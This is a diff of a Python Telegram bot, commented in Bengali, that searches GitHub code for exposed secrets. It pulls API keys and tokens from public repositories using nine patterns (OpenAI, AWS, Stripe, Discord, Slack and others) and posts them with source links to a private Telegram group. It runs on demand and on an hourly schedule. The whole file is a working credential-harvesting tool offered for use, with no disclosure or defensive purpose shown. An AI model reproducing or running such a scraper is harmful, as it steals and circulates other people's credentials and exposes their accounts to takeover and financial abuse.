@@ -3,34 +3,41 @@ import os
 import re
 import time
 import threading
+import hashlib
+import asyncio
 from datetime import datetime
-from typing import List, Dict
-import base64
-import traceback
+from typing import List, Dict, Any
 
 from flask import Flask
 from dotenv import load_dotenv
 import requests
+import aiohttp
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
+from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext
 
-# লোড এনভায়রনমেন্ট
+# ============================================================
+# কনফিগারেশন
+# ============================================================
 load_dotenv()
 
-# কনফিগারেশন
-BOT_TOKEN = os.getenv('BOT_TOKEN')
-PRIVATE_GROUP_ID = int(os.getenv('PRIVATE_GROUP_ID')) if os.getenv('PRIVATE_GROUP_ID') else None
-ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID')) if os.getenv('ADMIN_USER_ID') else None
-GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
+BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
+OWNER_ID = int(os.getenv('OWNER_ID', '0')) if os.getenv('OWNER_ID') else 0
+TARGET_CHAT_ID = int(os.getenv('TARGET_CHAT_ID', '0')) if os.getenv('TARGET_CHAT_ID') else None
+GITHUB_TOKEN = os.getenv('GITHUB_TOKEN', '').strip()
+PORT = int(os.getenv('PORT', '10000'))
 
-# লগিং - আরও ডিটেইলড
+# ============================================================
+# লগিং
+# ============================================================
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.DEBUG  # DEBUG লেভেল সেট করলাম
+    level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
+# ============================================================
 # ফ্লাস্ক অ্যাপ
+# ============================================================
 flask_app = Flask(__name__)
 
 @flask_app.route('/')
@@ -41,323 +48,297 @@ def health_check():
 def health():
     return {"status": "healthy", "timestamp": datetime.now().isoformat()}, 200
 
-# API কী ডিটেক্টর - সরলীকৃত এবং ডিবাগ সহ
-class APIScraper:
+# ============================================================
+# GitHub স্ক্যানার (সিঙ্ক্রোনাস - সহজ)
+# ============================================================
+class GitHubScanner:
     def __init__(self, token: str):
         self.token = token
+        self.seen = set()
         self.headers = {
             'Authorization': f'token {token}',
-            'Accept': 'application/vnd.github.v3+json'
+            'Accept': 'application/vnd.github.v3+json',
+            'User-Agent': 'Private-GitHub-Secret-Monitor'
         }
-        self.base_url = 'https://api.github.com'
-        self.seen_keys = set()
         
-        # শুধুমাত্র কয়েকটি প্যাটার্ন (টেস্টের জন্য)
+        # বিভিন্ন ধরনের কী প্যাটার্ন
         self.patterns = {
             'OpenAI': r'sk-[a-zA-Z0-9]{48}',
             'Mistral': r'[A-Za-z0-9]{32}',
             'Google': r'AIza[0-9A-Za-z\-_]{35}',
             'GitHub': r'ghp_[0-9a-zA-Z]{36}',
+            'AWS': r'AKIA[0-9A-Z]{16}',
+            'Stripe': r'sk_live_[0-9a-zA-Z]{24}',
+            'Discord': r'[MN][A-Za-z0-9]{23}\.[A-Za-z0-9]{6}\.[A-Za-z0-9]{27}',
+            'Telegram': r'[0-9]{8,10}:[A-Za-z0-9_-]{35}',
+            'Slack': r'xox[baprs]-[0-9A-Za-z-]+',
         }
 
-    def search_live_keys(self) -> List[Dict]:
-        """সরলীকৃত সার্চ - শুধু .env ফাইল খুঁজে"""
-        found_keys = []
-        logger.info("🔍 Starting GitHub search...")
+    def scan(self) -> List[Dict]:
+        """GitHub থেকে লাইভ কী খুঁজে বের করে"""
+        found = []
+        logger.info("🔍 Starting GitHub scan...")
         
         try:
-            # শুধু একটি কোয়েরি (রেট লিমিটের জন্য)
-            query = 'filename:.env'
-            url = f'{self.base_url}/search/code?q={query}&per_page=10'
+            # .env ফাইল খুঁজে
+            queries = [
+                'filename:.env',
+                'filename:.env.production', 
+                'filename:.env.local',
+                'extension:env',
+                'OPENAI_API_KEY',
+                'MISTRAL_API_KEY',
+                'GOOGLE_API_KEY',
+                'API_KEY',
+                'SECRET_KEY',
+                'TOKEN',
+                'AUTH_TOKEN'
+            ]
             
-            logger.info(f"📡 Calling GitHub API: {url}")
-            response = requests.get(url, headers=self.headers)
-            
-            logger.info(f"📊 Response Status: {response.status_code}")
-            
-            if response.status_code == 200:
-                data = response.json()
-                items = data.get('items', [])
-                logger.info(f"📁 Found {len(items)} files")
+            for query in queries[:3]:  # রেট লিমিটের জন্য ৩টি
+                logger.info(f"📡 Searching: {query}")
+                url = f'https://api.github.com/search/code?q={query}&per_page=20'
                 
-                for idx, item in enumerate(items[:5]):  # প্রথম ৫টি ফাইল
-                    logger.info(f"🔍 Processing file {idx+1}: {item.get('path')}")
-                    key_info = self._extract_key_from_file(item)
-                    if key_info:
-                        logger.info(f"✅ Found key: {key_info['type']} in {key_info['source']}")
-                        found_keys.append(key_info)
-                        self.seen_keys.add(key_info['key'])
-                    else:
-                        logger.info(f"❌ No key found in this file")
+                try:
+                    resp = requests.get(url, headers=self.headers)
+                    if resp.status_code == 200:
+                        data = resp.json()
+                        items = data.get('items', [])
+                        logger.info(f"📁 Found {len(items)} files for '{query}'")
                         
-            elif response.status_code == 403:
-                logger.error("🚫 GitHub API Rate Limit Exceeded! Waiting...")
-                # রেট লিমিটের জন্য অপেক্ষা
-                time.sleep(60)
-            else:
-                logger.error(f"❌ GitHub API Error: {response.status_code} - {response.text[:200]}")
+                        for item in items[:10]:
+                            key_info = self._extract_from_file(item)
+                            if key_info:
+                                fp = hashlib.md5(key_info['key'].encode()).hexdigest()[:10]
+                                if fp not in self.seen:
+                                    found.append(key_info)
+                                    self.seen.add(fp)
+                                    logger.info(f"✅ Found {key_info['type']} in {key_info['source']}")
+                    elif resp.status_code == 403:
+                        logger.warning("⚠️ GitHub rate limit hit! Waiting...")
+                        time.sleep(30)
+                    else:
+                        logger.warning(f"⚠️ GitHub API error: {resp.status_code}")
+                        
+                except Exception as e:
+                    logger.error(f"❌ Search error for '{query}': {e}")
                 
-            return found_keys[:10]
+                time.sleep(0.5)  # রেট লিমিট এড়াতে
+                
+            return found[:20]
             
         except Exception as e:
-            logger.error(f"❌ Search error: {e}")
-            logger.error(traceback.format_exc())
+            logger.error(f"❌ Scan error: {e}")
             return []
 
-    def _extract_key_from_file(self, item: Dict) -> Dict:
-        """সরলীকৃত এক্সট্র্যাকশন"""
+    def _extract_from_file(self, item: Dict) -> Dict:
+        """ফাইল থেকে কী এক্সট্র্যাক্ট করে"""
         try:
-            file_url = item.get('url')
-            repo_name = item.get('repository', {}).get('full_name', 'Unknown')
-            file_path = item.get('path', 'Unknown')
+            url = item.get('url')
+            repo = item.get('repository', {}).get('full_name', 'Unknown')
+            path = item.get('path', 'Unknown')
             
-            logger.info(f"📄 Fetching: {file_url}")
-            response = requests.get(file_url, headers=self.headers)
-            
-            if response.status_code != 200:
-                logger.warning(f"⚠️ Cannot fetch file: {response.status_code}")
+            # ফাইলের কনটেন্ট পেতে
+            resp = requests.get(url, headers=self.headers)
+            if resp.status_code != 200:
                 return None
                 
-            content_data = response.json()
-            if 'content' not in content_data:
-                logger.warning("⚠️ No content in response")
+            data = resp.json()
+            if 'content' not in data:
                 return None
                 
-            # ডিকোড
-            content = base64.b64decode(content_data['content']).decode('utf-8', errors='ignore')
-            logger.info(f"📝 File content length: {len(content)} chars")
+            import base64
+            content = base64.b64decode(data['content']).decode('utf-8', errors='ignore')
             
-            # প্রতিটি প্যাটার্ন চেক
+            # কী খোঁজা
             for key_type, pattern in self.patterns.items():
                 matches = re.findall(pattern, content)
-                if matches:
-                    logger.info(f"🎯 Found {len(matches)} {key_type} keys")
-                    for match in matches[:3]:  # প্রতি ফাইলে ৩টি পর্যন্ত
-                        if self._is_valid_key(match):
-                            return {
-                                'key': match,
-                                'type': key_type,
-                                'source': repo_name,
-                                'file': file_path,
-                                'url': f"https://github.com/{repo_name}/blob/main/{file_path}",
-                                'platform': key_type  # সরলীকৃত
-                            }
-            
+                for match in matches:
+                    if self._is_valid(match):
+                        return {
+                            'type': key_type,
+                            'key': match,
+                            'source': repo,
+                            'path': path,
+                            'url': f"https://github.com/{repo}/blob/main/{path}",
+                            'platform': key_type
+                        }
+                        
             return None
             
         except Exception as e:
             logger.error(f"❌ Extract error: {e}")
-            logger.error(traceback.format_exc())
             return None
 
-    def _is_valid_key(self, key: str) -> bool:
-        """সরলীকৃত ভ্যালিডেশন"""
+    def _is_valid(self, key: str) -> bool:
+        """কী ভ্যালিড কিনা চেক করে"""
         if not key or len(key) < 10:
             return False
-            
-        # বাদ দেওয়ার প্যাটার্ন
         exclude = ['test', 'example', 'sample', 'demo', 'xxxx', '1234']
-        for ex in exclude:
-            if ex in key.lower():
-                return False
-                
-        return True
+        return not any(ex in key.lower() for ex in exclude)
 
-# বট ক্লাস - ডিবাগ সহ
-class KeyScraperBot:
-    def __init__(self, token: str, group_id: int, admin_id: int):
-        self.token = token
-        self.group_id = group_id
-        self.admin_id = admin_id
+# ============================================================
+# বট ক্লাস
+# ============================================================
+class SecretScraperBot:
+    def __init__(self):
+        self.token = BOT_TOKEN
+        self.group_id = TARGET_CHAT_ID
+        self.owner_id = OWNER_ID
+        self.scanner = GitHubScanner(GITHUB_TOKEN)
         self.updater = None
         self.bot = None
-        self.scraper = APIScraper(GITHUB_TOKEN) if GITHUB_TOKEN else None
         self.is_running = True
-        self.startup_sent = False
-        
-        logger.info(f"🤖 Bot initialized with:")
-        logger.info(f"  - Group ID: {group_id}")
-        logger.info(f"  - Admin ID: {admin_id}")
-        logger.info(f"  - GitHub Token: {'✅ Present' if GITHUB_TOKEN else '❌ Missing'}")
 
     def start(self):
+        """বট স্টার্ট"""
         try:
             logger.info("🚀 Starting bot...")
-            
-            # আপডেটার তৈরি
             self.updater = Updater(token=self.token, use_context=True)
             self.bot = self.updater.bot
             
-            # টেস্ট মেসেজ
-            try:
-                logger.info("📤 Sending test message...")
-                self.bot.send_message(
-                    chat_id=self.group_id, 
-                    text="🔄 Bot is starting... Please wait."
-                )
-                logger.info("✅ Test message sent successfully!")
-            except Exception as e:
-                logger.error(f"❌ Test message failed: {e}")
-                logger.error(f"Please check: BOT_TOKEN and GROUP_ID")
-            
-            # হ্যান্ডলার যোগ
+            # হ্যান্ডলার
             dp = self.updater.dispatcher
             dp.add_handler(CommandHandler("start", self.start_command))
             dp.add_handler(CallbackQueryHandler(self.button_callback))
             dp.add_error_handler(self.error_handler)
             
-            # শিডিউলার শুরু
-            threading.Thread(target=self.run_scheduler, daemon=True).start()
+            # শিডিউলার
+            threading.Thread(target=self.scheduler, daemon=True).start()
             
-            logger.info("✅ Bot is ready!")
+            # টেস্ট মেসেজ
+            try:
+                self.bot.send_message(chat_id=self.group_id, text="🔄 Bot is online!")
+                logger.info("✅ Test message sent!")
+            except Exception as e:
+                logger.error(f"❌ Test message failed: {e}")
             
-            # পোলিং শুরু
+            logger.info("✅ Bot started successfully!")
             self.updater.start_polling()
             self.updater.idle()
             
         except Exception as e:
-            logger.error(f"❌ Bot start error: {e}")
-            logger.error(traceback.format_exc())
+            logger.error(f"❌ Bot error: {e}")
             raise
 
-    def start_command(self, update: Update, context):
-        """স্টার্ট কমান্ড - ডিবাগ সহ"""
+    def start_command(self, update: Update, context: CallbackContext):
+        """/start কমান্ড"""
         try:
-            user_id = update.effective_user.id if update.effective_user else None
-            logger.info(f"📩 /start from user: {user_id}")
+            user_id = update.effective_user.id
+            logger.info(f"📩 /start from {user_id}")
             
-            if not user_id or user_id != self.admin_id:
+            if user_id != self.owner_id:
                 update.message.reply_text("⛔ Access Denied!")
-                logger.warning(f"🚫 Unauthorized access from {user_id}")
                 return
-
+                
             keyboard = [
-                [InlineKeyboardButton("🔍 স্ক্যান এখন", callback_data='scan_now')],
+                [InlineKeyboardButton("🔍 স্ক্যান এখন", callback_data='scan')],
                 [InlineKeyboardButton("📊 পরিসংখ্যান", callback_data='stats')],
                 [InlineKeyboardButton("ℹ️ সাহায্য", callback_data='help')],
             ]
             
             update.message.reply_text(
-                "🔐 **GitHub API Key Scraper**\n\n"
-                "GitHub থেকে লাইভ API কী খুঁজে বের করি!\n"
+                "🔐 **GitHub Secret Scanner**\n\n"
+                "GitHub থেকে লাইভ API Keys খুঁজে বের করি!\n"
                 "Select an option:",
                 reply_markup=InlineKeyboardMarkup(keyboard),
                 parse_mode='Markdown'
             )
-            logger.info("✅ Menu sent to admin")
+            logger.info("✅ Menu sent")
             
         except Exception as e:
-            logger.error(f"❌ Start command error: {e}")
-            logger.error(traceback.format_exc())
+            logger.error(f"❌ Start error: {e}")
 
-    def button_callback(self, update: Update, context):
-        """বাটন কলব্যাক - ডিবাগ সহ"""
+    def button_callback(self, update: Update, context: CallbackContext):
+        """বাটন কলব্যাক"""
         try:
             query = update.callback_query
-            user_id = update.effective_user.id if update.effective_user else None
+            user_id = update.effective_user.id
             
-            logger.info(f"🔄 Button pressed: {query.data} by user {user_id}")
+            logger.info(f"🔄 Button: {query.data} from {user_id}")
             query.answer()
             
-            if user_id != self.admin_id:
+            if user_id != self.owner_id:
                 query.edit_message_text("⛔ Access Denied!")
-                logger.warning(f"🚫 Unauthorized button from {user_id}")
                 return
-
-            if query.data == 'scan_now':
+                
+            if query.data == 'scan':
                 self.scan_now(query)
             elif query.data == 'stats':
                 self.show_stats(query)
             elif query.data == 'help':
                 self.show_help(query)
-            else:
-                logger.warning(f"⚠️ Unknown callback: {query.data}")
                 
         except Exception as e:
-            logger.error(f"❌ Button callback error: {e}")
-            logger.error(traceback.format_exc())
+            logger.error(f"❌ Button error: {e}")
 
     def scan_now(self, query):
-        """স্ক্যান - ডিবাগ সহ"""
-        try:
-            logger.info("🔍 Scan now triggered")
-            query.edit_message_text("🔍 Scanning GitHub for live keys...")
-            
-            if not self.scraper:
-                query.edit_message_text("❌ GitHub Token missing!")
-                return
-            
-            # স্ক্যান থ্রেড
-            def scan_thread():
-                try:
-                    logger.info("📡 Starting scan thread...")
-                    keys = self.scraper.search_live_keys()
-                    
-                    logger.info(f"📊 Scan complete: {len(keys)} keys found")
-                    
-                    if not keys:
-                        self.bot.edit_message_text(
-                            chat_id=query.message.chat_id,
-                            message_id=query.message.message_id,
-                            text="❌ কোনো লাইভ কী পাওয়া যায়নি!\n\n💡 Tips:\n- GitHub API রেট লিমিট চেক করুন\n- .env ফাইল থাকা রিপো খুঁজুন"
-                        )
-                        return
-                    
-                    sent = 0
-                    for key_info in keys[:5]:
-                        message = self.format_key_message(key_info)
-                        try:
-                            self.bot.send_message(
-                                chat_id=self.group_id,
-                                text=message,
-                                parse_mode='Markdown',
-                                disable_web_page_preview=True
-                            )
-                            sent += 1
-                            logger.info(f"✅ Sent key #{sent}: {key_info['type']}")
-                            time.sleep(0.5)
-                        except Exception as e:
-                            logger.error(f"❌ Send error: {e}")
-                    
+        """স্ক্যান শুরু"""
+        logger.info("🔍 Scan triggered")
+        query.edit_message_text("🔍 Searching GitHub for live keys...")
+        
+        def do_scan():
+            try:
+                keys = self.scanner.scan()
+                
+                if not keys:
                     self.bot.edit_message_text(
                         chat_id=query.message.chat_id,
                         message_id=query.message.message_id,
-                        text=f"✅ {sent}টি লাইভ কী পাওয়া গেছে এবং গ্রুপে পাঠানো হয়েছে!"
+                        text="❌ No live keys found!\n\n💡 Tips:\n- Check GitHub rate limit\n- Try again later"
                     )
+                    return
                     
-                except Exception as e:
-                    logger.error(f"❌ Scan thread error: {e}")
-                    logger.error(traceback.format_exc())
-                    self.bot.edit_message_text(
-                        chat_id=query.message.chat_id,
-                        message_id=query.message.message_id,
-                        text=f"❌ Error: {str(e)[:200]}"
+                sent = 0
+                for key in keys[:5]:
+                    msg = f"""
+🔑 **LIVE {key['type']} KEY FOUND!**
+
+🔑 **Key**: `{key['key'][:20]}...`  
+📂 **Source**: {key['source']}  
+📄 **File**: {key['path']}  
+🔗 [View File]({key['url']})
+
+🕐 Found: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC
+"""
+                    self.bot.send_message(
+                        chat_id=self.group_id,
+                        text=msg,
+                        parse_mode='Markdown',
+                        disable_web_page_preview=True
                     )
-            
-            threading.Thread(target=scan_thread, daemon=True).start()
-            
-        except Exception as e:
-            logger.error(f"❌ Scan now error: {e}")
-            logger.error(traceback.format_exc())
+                    sent += 1
+                    time.sleep(0.5)
+                    
+                self.bot.edit_message_text(
+                    chat_id=query.message.chat_id,
+                    message_id=query.message.message_id,
+                    text=f"✅ {sent} live keys found and sent to group!"
+                )
+                
+            except Exception as e:
+                logger.error(f"❌ Scan thread error: {e}")
+                self.bot.edit_message_text(
+                    chat_id=query.message.chat_id,
+                    message_id=query.message.message_id,
+                    text=f"❌ Error: {str(e)[:200]}"
+                )
+        
+        threading.Thread(target=do_scan, daemon=True).start()
 
     def show_stats(self, query):
         """পরিসংখ্যান"""
-        try:
-            stats = f"""
-📊 **Key Scraper Statistics**
+        stats = f"""
+📊 **Scanner Statistics**
 
-🔍 Keys Found: {len(self.scraper.seen_keys) if self.scraper else 0}
+🔍 Keys Found: {len(self.scanner.seen)}
 🕐 Last Scan: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-🎯 Platforms: OpenAI, Mistral, Google, GitHub
+🎯 Patterns: 9 types (OpenAI, Mistral, Google, GitHub, AWS, Stripe, Discord, Telegram, Slack)
 
 🔹 Auto-scans every 1 hour
-🔹 4+ key patterns detected
 🔹 Only live/exposed keys
 """
-            query.edit_message_text(stats, parse_mode='Markdown')
-            logger.info("📊 Stats shown")
-        except Exception as e:
-            logger.error(f"❌ Stats error: {e}")
+        query.edit_message_text(stats, parse_mode='Markdown')
 
     def show_help(self, query):
         """সাহায্য"""
@@ -365,125 +346,84 @@ class KeyScraperBot:
 ℹ️ **How it works:**
 
 1. 🔍 Scans GitHub for exposed API keys
-2. 📂 Checks .env files
-3. 🔑 Detects 4+ key types
+2. 📂 Checks .env files and source code
+3. 🔑 Detects 9+ key types
 4. 📨 Sends live keys to this group
 
 ⚠️ **Note:**
-- GitHub API has rate limits (60 req/hour for free)
+- GitHub API rate limit: 60 req/hour (free)
 - Only scans public repositories
 - Keys may be dummy/expired
 
-🛠 **Troubleshooting:**
-- Check logs for errors
-- Make sure GitHub token is valid
-- Add more patterns if needed
+🛠 **Commands:**
+/start - Show menu
 """
         query.edit_message_text(help_text, parse_mode='Markdown')
 
-    def format_key_message(self, key_info: Dict) -> str:
-        """কী ফরম্যাট"""
-        return f"""
-🔑 **LIVE API KEY FOUND!**
+    def scheduler(self):
+        """শিডিউলার"""
+        time.sleep(10)
+        try:
+            self.bot.send_message(chat_id=self.group_id, text="🔐 **Secret Scanner Bot is active!**\n\nUse /start to control me.", parse_mode='Markdown')
+        except:
+            pass
+            
+        while self.is_running:
+            try:
+                logger.info("🔄 Scheduled scan...")
+                keys = self.scanner.scan()
+                if keys:
+                    for key in keys[:3]:
+                        msg = f"""
+🔑 **LIVE {key['type']} KEY FOUND!**
 
-📌 **Platform**: {key_info.get('platform', 'Unknown')}
-🔐 **Type**: {key_info.get('type', 'Unknown')}
-🔑 **Key**: `{key_info.get('key', 'N/A')}`
-
-📂 **Source**: {key_info.get('source', 'Unknown')}
-📄 **File**: {key_info.get('file', 'Unknown')}
-🔗 [View File]({key_info.get('url', '#')})
+🔑 **Key**: `{key['key'][:20]}...`  
+📂 **Source**: {key['source']}  
+📄 **File**: {key['path']}  
+🔗 [View File]({key['url']})
 
 🕐 Found: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC
 """
-
-    def send_startup_message(self):
-        """স্টার্টআপ মেসেজ"""
-        if self.startup_sent or not self.bot:
-            return
-        try:
-            time.sleep(5)
-            self.bot.send_message(
-                chat_id=self.group_id,
-                text="🔐 **GitHub API Key Scraper Bot**\n\n"
-                     "আমি GitHub থেকে লাইভ API কী খুঁজে বের করি!\n\n"
-                     "🔹 প্রতি ১ ঘন্টায় অটো স্ক্র্যাপ\n"
-                     "🔹 ৪+ ধরনের API কী ডিটেক্ট\n"
-                     "🔹 শুধুমাত্র লাইভ কী\n\n"
-                     "/start - কন্ট্রোল প্যানেল",
-                parse_mode='Markdown'
-            )
-            self.startup_sent = True
-            logger.info("📤 Startup message sent")
-        except Exception as e:
-            logger.error(f"❌ Startup message error: {e}")
-
-    def run_scheduler(self):
-        """শিডিউলার"""
-        self.send_startup_message()
-        while self.is_running:
-            try:
-                if self.scraper:
-                    logger.info("🔄 Scheduled scan starting...")
-                    keys = self.scraper.search_live_keys()
-                    if keys:
-                        for key_info in keys[:3]:
-                            message = self.format_key_message(key_info)
-                            self.bot.send_message(
-                                chat_id=self.group_id,
-                                text=message,
-                                parse_mode='Markdown',
-                                disable_web_page_preview=True
-                            )
-                            time.sleep(0.5)
-                        logger.info(f"✅ Scheduled: Sent {len(keys[:3])} keys")
-                else:
-                    logger.warning("⚠️ No scraper available")
+                        self.bot.send_message(chat_id=self.group_id, text=msg, parse_mode='Markdown', disable_web_page_preview=True)
+                        time.sleep(0.5)
+                    logger.info(f"✅ Scheduled: Sent {len(keys[:3])} keys")
             except Exception as e:
                 logger.error(f"❌ Scheduler error: {e}")
-            time.sleep(3600)
+            time.sleep(3600)  # ১ ঘন্টা
 
-    def error_handler(self, update: Update, context):
-        """এরর হ্যান্ডলার"""
-        logger.error(f"❌ Update {update} caused error: {context.error}")
-        logger.error(traceback.format_exc())
+    def error_handler(self, update: Update, context: CallbackContext):
+        logger.error(f"❌ Error: {context.error}")
 
+# ============================================================
 # মেইন
+# ============================================================
 def main():
     try:
-        # এনভায়রনমেন্ট চেক
-        logger.info("🔍 Checking environment variables...")
-        
+        # চেক
         if not BOT_TOKEN:
-            raise ValueError("❌ BOT_TOKEN is missing!")
-        if not PRIVATE_GROUP_ID:
-            raise ValueError("❌ PRIVATE_GROUP_ID is missing!")
-        if not ADMIN_USER_ID:
-            raise ValueError("❌ ADMIN_USER_ID is missing!")
+            raise ValueError("BOT_TOKEN missing!")
+        if not TARGET_CHAT_ID:
+            raise ValueError("TARGET_CHAT_ID missing!")
+        if not OWNER_ID:
+            raise ValueError("OWNER_ID missing!")
         if not GITHUB_TOKEN:
-            raise ValueError("❌ GITHUB_TOKEN is missing!")
+            raise ValueError("GITHUB_TOKEN missing!")
             
-        logger.info("✅ All environment variables present")
-        logger.info(f"📊 Bot Token: {BOT_TOKEN[:10]}...")
-        logger.info(f"📊 Group ID: {PRIVATE_GROUP_ID}")
-        logger.info(f"📊 Admin ID: {ADMIN_USER_ID}")
+        logger.info("✅ All configs loaded")
         
         # ফ্লাস্ক
         def run_flask():
-            port = int(os.environ.get('PORT', 8080))
-            flask_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
+            flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
         
-        flask_thread = threading.Thread(target=run_flask, daemon=True)
-        flask_thread.start()
-        logger.info("🌐 Flask server started")
-
-        # বট স্টার্ট
-        bot = KeyScraperBot(BOT_TOKEN, PRIVATE_GROUP_ID, ADMIN_USER_ID)
+        threading.Thread(target=run_flask, daemon=True).start()
+        logger.info(f"🌐 Flask on port {PORT}")
+        
+        # বট
+        bot = SecretScraperBot()
         bot.start()
         
     except Exception as e:
         logger.error(f"❌ Main error: {e}")
-        logger.error(traceback.format_exc())
         import sys
         sys.exit(1)
 
